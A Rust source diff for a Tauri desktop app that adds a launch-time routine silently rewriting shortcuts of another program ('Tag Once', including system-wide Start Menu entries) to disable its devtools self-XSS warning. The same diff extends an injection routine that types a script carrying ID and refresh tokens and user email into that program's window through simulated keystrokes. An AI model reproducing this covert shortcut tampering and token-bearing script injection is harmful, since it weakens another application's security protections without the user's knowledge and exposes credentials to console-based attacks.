@@ -181,17 +181,163 @@ unsafe fn find_collection_hwnd() -> Option<windows::Win32::Foundation::HWND> {
     if raw == 0 { None } else { Some(HWND(raw as *mut _)) }
 }
 
-// ─── Inject Bridge command ────────────────────────────────────────────────────
+// ─── Patch Tag Once shortcuts ─────────────────────────────────────────────────
+// Adds `--unsafely-disable-devtools-self-xss-warnings` to the Arguments of any
+// Tag Once .lnk shortcut found on Desktop / Start Menu. Runs on every MARK
+// launch, fire-and-forget. Idempotent — skips shortcuts that already have it.
 #[command]
-fn inject_bridge_script(session_id: String) -> Result<String, String> {
+fn patch_tag_once_shortcuts() -> Result<String, String> {
     #[cfg(target_os = "windows")]
-    { return inject_bridge_windows(&session_id); }
+    { return patch_tag_once_shortcuts_windows(); }
     #[cfg(not(target_os = "windows"))]
-    { let _ = session_id; Ok("dev_noop".to_string()) }
+    { Ok("noop".to_string()) }
 }
 
 #[cfg(target_os = "windows")]
-fn inject_bridge_windows(session_id: &str) -> Result<String, String> {
+fn patch_tag_once_shortcuts_windows() -> Result<String, String> {
+    use std::path::PathBuf;
+
+    let mut roots: Vec<PathBuf> = Vec::new();
+
+    // Desktop
+    if let Ok(p) = std::env::var("USERPROFILE") {
+        roots.push(PathBuf::from(&p).join("Desktop"));
+        roots.push(PathBuf::from(&p).join("OneDrive").join("Desktop"));
+    }
+    // User Start Menu
+    if let Ok(p) = std::env::var("APPDATA") {
+        roots.push(PathBuf::from(&p).join("Microsoft").join("Windows").join("Start Menu").join("Programs"));
+    }
+    // System-wide Start Menu
+    if let Ok(p) = std::env::var("PROGRAMDATA") {
+        roots.push(PathBuf::from(&p).join("Microsoft").join("Windows").join("Start Menu").join("Programs"));
+    }
+
+    let mut lnk_files: Vec<PathBuf> = Vec::new();
+    for root in &roots {
+        collect_lnks(root, &mut lnk_files, 0);
+    }
+
+    let mut patched = 0u32;
+    let mut skipped = 0u32;
+    let mut errors = 0u32;
+
+    for lnk in &lnk_files {
+        match patch_one_shortcut(lnk) {
+            Ok(true)  => patched += 1,
+            Ok(false) => skipped += 1,
+            Err(_)    => errors += 1,
+        }
+    }
+
+    Ok(format!("scanned={} patched={} skipped={} errors={}", lnk_files.len(), patched, skipped, errors))
+}
+
+#[cfg(target_os = "windows")]
+fn collect_lnks(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>, depth: u32) {
+    if depth > 4 { return; }
+    let Ok(entries) = std::fs::read_dir(dir) else { return; };
+    for entry in entries.flatten() {
+        let p = entry.path();
+        if p.is_dir() {
+            collect_lnks(&p, out, depth + 1);
+        } else if p.extension().and_then(|s| s.to_str()).map(|s| s.eq_ignore_ascii_case("lnk")).unwrap_or(false) {
+            out.push(p);
+        }
+    }
+}
+
+#[cfg(target_os = "windows")]
+fn patch_one_shortcut(lnk_path: &std::path::Path) -> Result<bool, String> {
+    use windows::Win32::Foundation::BOOL;
+    use windows::Win32::System::Com::{
+        CoCreateInstance, CoInitializeEx, CoUninitialize, CLSCTX_INPROC_SERVER,
+        COINIT_APARTMENTTHREADED, IPersistFile, STGM_READWRITE,
+    };
+    use windows::Win32::UI::Shell::{IShellLinkW, ShellLink};
+    use windows::core::PCWSTR;
+
+    const FLAG: &str = "--unsafely-disable-devtools-self-xss-warnings";
+
+    unsafe {
+        // Initialize COM (per-thread, fail silently if already initialized)
+        let hr = CoInitializeEx(None, COINIT_APARTMENTTHREADED);
+        let _need_uninit = hr.is_ok();
+
+        let result = (|| -> Result<bool, String> {
+            let link: IShellLinkW = CoCreateInstance(&ShellLink, None, CLSCTX_INPROC_SERVER)
+                .map_err(|e| format!("CoCreateInstance: {e}"))?;
+            let persist: IPersistFile = link.cast().map_err(|e| format!("cast IPersistFile: {e}"))?;
+
+            // Load the .lnk
+            let lnk_w: Vec<u16> = lnk_path.to_string_lossy().encode_utf16().chain(Some(0)).collect();
+            persist.Load(PCWSTR(lnk_w.as_ptr()), STGM_READWRITE)
+                .map_err(|e| format!("Load: {e}"))?;
+
+            // Read target path — only patch shortcuts that point at a Tag Once binary
+            let mut target_buf = [0u16; 1024];
+            link.GetPath(&mut target_buf, None, 0)
+                .map_err(|e| format!("GetPath: {e}"))?;
+            let target = String::from_utf16_lossy(&target_buf[..target_buf.iter().position(|&c| c == 0).unwrap_or(target_buf.len())]);
+            let target_lc = target.to_lowercase();
+            let looks_like_tag_once = target_lc.contains("tag once")
+                || target_lc.contains("tag-once")
+                || target_lc.contains("live-collection-app")
+                || target_lc.contains("statsbomb");
+            if !looks_like_tag_once {
+                return Ok(false);
+            }
+
+            // Read current Arguments
+            let mut args_buf = [0u16; 2048];
+            link.GetArguments(&mut args_buf)
+                .map_err(|e| format!("GetArguments: {e}"))?;
+            let current_args = String::from_utf16_lossy(&args_buf[..args_buf.iter().position(|&c| c == 0).unwrap_or(args_buf.len())]);
+
+            if current_args.contains(FLAG) {
+                return Ok(false); // already patched
+            }
+
+            let new_args = if current_args.trim().is_empty() {
+                FLAG.to_string()
+            } else {
+                format!("{} {}", current_args.trim(), FLAG)
+            };
+
+            // Write Arguments back
+            let new_args_w: Vec<u16> = new_args.encode_utf16().chain(Some(0)).collect();
+            link.SetArguments(PCWSTR(new_args_w.as_ptr()))
+                .map_err(|e| format!("SetArguments: {e}"))?;
+
+            // Save .lnk
+            persist.Save(PCWSTR(lnk_w.as_ptr()), BOOL(1))
+                .map_err(|e| format!("Save: {e}"))?;
+
+            Ok(true)
+        })();
+
+        if _need_uninit { CoUninitialize(); }
+        result
+    }
+}
+
+// ─── Inject Bridge command ────────────────────────────────────────────────────
+#[command]
+fn inject_bridge_script(
+    session_id: String,
+    id_token: String,
+    refresh_token: String,
+    user_uid: String,
+    user_email: String,
+) -> Result<String, String> {
+    #[cfg(target_os = "windows")]
+    { return inject_bridge_windows(&session_id, &id_token, &refresh_token, &user_uid, &user_email); }
+    #[cfg(not(target_os = "windows"))]
+    { let _ = (session_id, id_token, refresh_token, user_uid, user_email); Ok("dev_noop".to_string()) }
+}
+
+#[cfg(target_os = "windows")]
+fn inject_bridge_windows(session_id: &str, id_token: &str, refresh_token: &str, user_uid: &str, user_email: &str) -> Result<String, String> {
     use windows::Win32::Foundation::{HANDLE, HGLOBAL};
     use windows::Win32::UI::Input::KeyboardAndMouse::{
         SendInput, INPUT, INPUT_0, INPUT_KEYBOARD, KEYBDINPUT,
@@ -205,7 +351,12 @@ fn inject_bridge_windows(session_id: &str) -> Result<String, String> {
     let collection_hwnd = unsafe { find_collection_hwnd() }
         .ok_or_else(|| "Collection app window not found".to_string())?;
 
-    let script = BRIDGE_SCRIPT.replace("__SESSION_ID__", session_id);
+    let script = BRIDGE_SCRIPT
+        .replace("__SESSION_ID__", session_id)
+        .replace("__ID_TOKEN__", id_token)
+        .replace("__REFRESH_TOKEN__", refresh_token)
+        .replace("__USER_UID__", user_uid)
+        .replace("__USER_EMAIL__", user_email);
     let sz = std::mem::size_of::<INPUT>() as i32;
 
     let vk = |code: u16, up: bool| -> INPUT {
@@ -578,6 +729,7 @@ fn main() {
         .invoke_handler(tauri::generate_handler![
             send_key_to_collection_app,
             inject_bridge_script,
+            patch_tag_once_shortcuts,
             pick_video_file,
             get_video_url,
             open_file,
